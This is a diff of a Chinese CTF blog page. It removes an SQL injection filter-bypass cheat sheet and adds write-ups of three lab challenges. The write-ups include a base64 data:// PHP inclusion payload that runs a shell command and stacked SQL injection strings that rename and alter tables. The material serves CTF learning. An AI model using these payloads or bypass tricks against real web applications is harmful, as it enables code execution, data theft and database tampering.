@@ -19,29 +19,27 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="绕过常见方式注释#,–,– -,–+,&#x2F;&#x2F;,&#x2F;**&#x2F;,&#x2F;letmetest&#x2F;,;%00 空格可以代替空格的字符&#x2F;**&#x2F;,(),+,%20,%09,%0a,0x0a,0x0b,0x0c,0x0d等还可以使用+,-,~,.等例如:union+select+1,2 编码hex编码，URL编码，宽字节，Unicode编码(iis支持)URL编码:%6f%72%20%31%3d%31(and 1&#x3D;1)Uni">
+    <meta name="description" content="web入门37if(isset($_GET[‘c’])){  $c &#x3D; $_GET[‘c’];  if(!preg_match(“&#x2F;flag&#x2F;i”, $c)){    include($c);    echo $flag;   } }else{  highlight_file(FILE);}这题用data伪协议,主要用于数据流的读取，传入的数据是php代码就会执行data:&#x2F;&#x2F;类似php:&#x2F;&#x2F;in">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sql注入之bypass技巧">
-<meta property="og:url" content="http://example.com/2023/01/11/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bbypass%E6%8A%80%E5%B7%A7/index.html">
+<meta property="og:title" content="部分题记">
+<meta property="og:url" content="http://example.com/2023/02/15/%E9%83%A8%E5%88%86%E9%A2%98%E8%AE%B0/index.html">
 <meta property="og:site_name" content="The future is promising">
-<meta property="og:description" content="绕过常见方式注释#,–,– -,–+,&#x2F;&#x2F;,&#x2F;**&#x2F;,&#x2F;letmetest&#x2F;,;%00 空格可以代替空格的字符&#x2F;**&#x2F;,(),+,%20,%09,%0a,0x0a,0x0b,0x0c,0x0d等还可以使用+,-,~,.等例如:union+select+1,2 编码hex编码，URL编码，宽字节，Unicode编码(iis支持)URL编码:%6f%72%20%31%3d%31(and 1&#x3D;1)Uni">
+<meta property="og:description" content="web入门37if(isset($_GET[‘c’])){  $c &#x3D; $_GET[‘c’];  if(!preg_match(“&#x2F;flag&#x2F;i”, $c)){    include($c);    echo $flag;   } }else{  highlight_file(FILE);}这题用data伪协议,主要用于数据流的读取，传入的数据是php代码就会执行data:&#x2F;&#x2F;类似php:&#x2F;&#x2F;in">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-01-11T09:06:37.000Z">
-<meta property="article:modified_time" content="2023-01-11T10:00:02.193Z">
+<meta property="article:published_time" content="2023-02-15T11:52:32.000Z">
+<meta property="article:modified_time" content="2023-02-15T13:34:42.330Z">
 <meta property="article:author" content="清者">
-<meta property="article:tag" content="拼搏">
-<meta property="article:tag" content="奋斗">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://example.com/2023/01/11/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bbypass%E6%8A%80%E5%B7%A7/">
+<link rel="canonical" href="http://example.com/2023/02/15/%E9%83%A8%E5%88%86%E9%A2%98%E8%AE%B0/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/01/11/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bbypass%E6%8A%80%E5%B7%A7/","path":"2023/01/11/sql注入之bypass技巧/","title":"sql注入之bypass技巧"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/02/15/%E9%83%A8%E5%88%86%E9%A2%98%E8%AE%B0/","path":"2023/02/15/部分题记/","title":"部分题记"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>sql注入之bypass技巧 | The future is promising</title>
+<title>部分题记 | The future is promising</title>
   
 
 
@@ -141,7 +139,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%B8%B8%E8%A7%81%E6%96%B9%E5%BC%8F"><span class="nav-number">1.</span> <span class="nav-text">绕过常见方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A"><span class="nav-number">1.1.</span> <span class="nav-text">注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC"><span class="nav-number">1.2.</span> <span class="nav-text">空格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81"><span class="nav-number">1.3.</span> <span class="nav-text">编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%89%E4%BB%B7%E5%AD%97%E7%AC%A6%E4%BB%A5%E5%8F%8A%E7%AD%89%E4%BB%B7%E5%87%BD%E6%95%B0"><span class="nav-number">1.4.</span> <span class="nav-text">等价字符以及等价函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql%E7%89%B9%E6%80%A7"><span class="nav-number">1.5.</span> <span class="nav-text">mysql特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E6%8B%86%E5%88%86"><span class="nav-number">1.6.</span> <span class="nav-text">关键字拆分</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="nav-number">1.7.</span> <span class="nav-text">内联注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">1.8.</span> <span class="nav-text">判断注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="nav-number">1.9.</span> <span class="nav-text">判断列数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="nav-number">1.10.</span> <span class="nav-text">联合查询</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E5%85%A5%E9%97%A837"><span class="nav-number">1.</span> <span class="nav-text">web入门37</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#buuctf%E9%9A%8F%E4%BE%BF%E6%B3%A81"><span class="nav-number">2.</span> <span class="nav-text">buuctf随便注1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#buuctf-EasySQL1"><span class="nav-number">3.</span> <span class="nav-text">buuctf EasySQL1</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -202,7 +200,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/11/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bbypass%E6%8A%80%E5%B7%A7/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/15/%E9%83%A8%E5%88%86%E9%A2%98%E8%AE%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/apple-touch-icon-next.png">
@@ -215,12 +213,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="sql注入之bypass技巧 | The future is promising">
+      <meta itemprop="name" content="部分题记 | The future is promising">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          sql注入之bypass技巧
+          部分题记
         </h1>
 
         <div class="post-meta-container">
@@ -232,7 +230,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2023-01-11 17:06:37 / 修改时间：18:00:02" itemprop="dateCreated datePublished" datetime="2023-01-11T17:06:37+08:00">2023-01-11</time>
+      <time title="创建时间：2023-02-15 19:52:32 / 修改时间：21:34:42" itemprop="dateCreated datePublished" datetime="2023-02-15T19:52:32+08:00">2023-02-15</time>
     </span>
 
   
@@ -245,16 +243,11 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="绕过常见方式"><a href="#绕过常见方式" class="headerlink" title="绕过常见方式"></a>绕过常见方式</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>#,–,– -,–+,//,/**/,/<em>letmetest</em>/,;%00</p>
-<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><p>可以代替空格的字符<br>/**/,(),+,%20,%09,%0a,0x0a,0x0b,0x0c,0x0d等<br>还可以使用<br>+,-,~,.等<br>例如:union+select+1,2</p>
-<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>hex编码，URL编码，宽字节，Unicode编码(iis支持)<br>URL编码:%6f%72%20%31%3d%31(and 1=1)<br>Unicode编码:un%u0069on</p>
-<h3 id="等价字符以及等价函数"><a href="#等价字符以及等价函数" class="headerlink" title="等价字符以及等价函数"></a>等价字符以及等价函数</h3><p>and==&gt;&amp;&amp;<br>or==&gt;||<br>xor==&gt;^<br>not==&gt;!<br>hex(),bin()==&gt;ascii()<br>concat_ws()==&gt;group_concat()<br>sleep()==&gt;benchmark()<br>mid(),substr()==&gt;substring()<br>@@user==&gt;user()<br>@@datadir==&gt;datadir()</p>
-<h3 id="mysql特性"><a href="#mysql特性" class="headerlink" title="mysql特性"></a>mysql特性</h3><p>mysql中=为等于的意思,只有在update中是赋值<br>:=  赋值<br>@   @加变量名可以直接调用</p>
-<h3 id="关键字拆分"><a href="#关键字拆分" class="headerlink" title="关键字拆分"></a>关键字拆分</h3><p>se’+’le’+’ct’<br>%S%E%L%E%C%T1<br>U/**/NION</p>
-<h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><p>/<em>!Unlon</em>/</p>
-<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>and 1=1,and ‘a’=’a’,and 1(and 0),and hex(1),and hex(0),and !,/<em>!1</em>/,/<em>!0</em>/,and–+a%0a1/<em>!=</em>/0</p>
-<h3 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h3><p>order by 20 (后面加数字)</p>
-<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>union select 1,2,3,……,得到的列数<br>之后便可以替换掉其中的数字来获取想要的信息</p>
+        <h2 id="web入门37"><a href="#web入门37" class="headerlink" title="web入门37"></a>web入门37</h2><p>if(isset($_GET[‘c’])){<br>  $c = $_GET[‘c’];<br>  if(!preg_match(“/flag/i”, $c)){<br>    include($c);<br>    echo $flag;</p>
+<p>  }</p>
+<p>}else{<br>  highlight_file(<strong>FILE</strong>);<br>}<br>这题用data伪协议,主要用于数据流的读取，传入的数据是php代码就会执行<br>data://类似php://input，可用来控制输入流，与包含函数结合时，输入的data://流会被当成php文件执行。此题就与include()函数相结合<br>一般使用方法：<br>data://text/plain;base64; base64编码后的数据即data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==<br>不用之前php伪协议的方法，因为本身含include包含函数</p>
+<h2 id="buuctf随便注1"><a href="#buuctf随便注1" class="headerlink" title="buuctf随便注1"></a>buuctf随便注1</h2><p>先测试是否存在注入and 1=1和and 1=2没有变化，在参数后面加单引号，发现错误，可以尝试进行注入<br>尝试0‘ or ‘1’=’1；0” or “1”=”1等，发现可行<br>尝试order by+数字，直至返回错误，获得表中的列树；#号用来注释掉后面的命令<br>1’ order by 2#<br>2’ order by 3#<br>发现3的时候报错，所以表中只有两列数据<br>然后联合查询，发现select等操作被过滤1’ union select 1,2<br>获取表名，发现有两个表0’; show tables;#<br>获取表中的列名，发现被查询的是words表，而flag在另一个表中，我们需要获取其中的饿内容<br>0’; show columns from words;#<br>0’; show columns from <code>1919810931114514</code>;#<br>更改表名列名<br>因为查询是在words中查询id的，所以我们将表1919810931114514改名为words，将words改名为其余的名字。同时将flag属性改名为id属性，类型为varchar(100)<br>0’;rename table <code>words</code> to words2;rename table <code>1919810931114514</code> to words;alter table words change flag id varchar(100);show tables;#<br>查看改之后的words表中的所有内容获得flag<br>1’ or ‘1’=’1</p>
+<h2 id="buuctf-EasySQL1"><a href="#buuctf-EasySQL1" class="headerlink" title="buuctf EasySQL1"></a>buuctf EasySQL1</h2><p>先尝试输入1查看回显可以看到表格回显了内容：1，用其他非0数字尝试全都回显1，换个数字尝试，比如0什么都没有。用字母同理无回显。<br>使用Sql堆叠注入查看信息，先用show指令查看数据库：1;show databases;<br>再查看一下表：1；show tables；<br>看到Flag表，猜测flag应该在Flag中。但是用1;show columns from Flag;无法回显出flag只会回显Nonono.<br>说明flag被过滤掉了（注：1;show columns from用来查询表中列名称）<br>构建payload：*,1直接得到flag<br>已知后端语句是select 输入内容 || flag from Flag，输入*，1就相当于构造了select *，1 || flag from Flag，这条语句执行起来相当于select *, 1 from Flag<br>因为1||flag是个短路算法，直接输出1了<br>select *和select 所有列的意义相同，那么我们构造的select *，1 || flag from Flag ==select *,1 from Flag </p>
 
     </div>
 
@@ -263,22 +256,18 @@
     
 
     <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E6%8B%BC%E6%90%8F/" rel="tag"># 拼搏</a>
-              <a href="/tags/%E5%A5%8B%E6%96%97/" rel="tag"># 奋斗</a>
-          </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2022/12/16/hello-world/" rel="prev" title="Hello World">
-                  <i class="fa fa-chevron-left"></i> Hello World
+                <a href="/2023/02/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%83%A8%E5%88%86%E9%A2%98%E8%AE%B0/" rel="prev" title="攻防世界部分题记">
+                  <i class="fa fa-chevron-left"></i> 攻防世界部分题记
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2023/01/13/sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" rel="next" title="sql 手工注入">
-                  sql 手工注入 <i class="fa fa-chevron-right"></i>
+                <a href="/2023/02/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%83%A8%E5%88%86%E9%A2%98%E8%AE%B0/" rel="next" title="命令执行部分题记">
+                  命令执行部分题记 <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
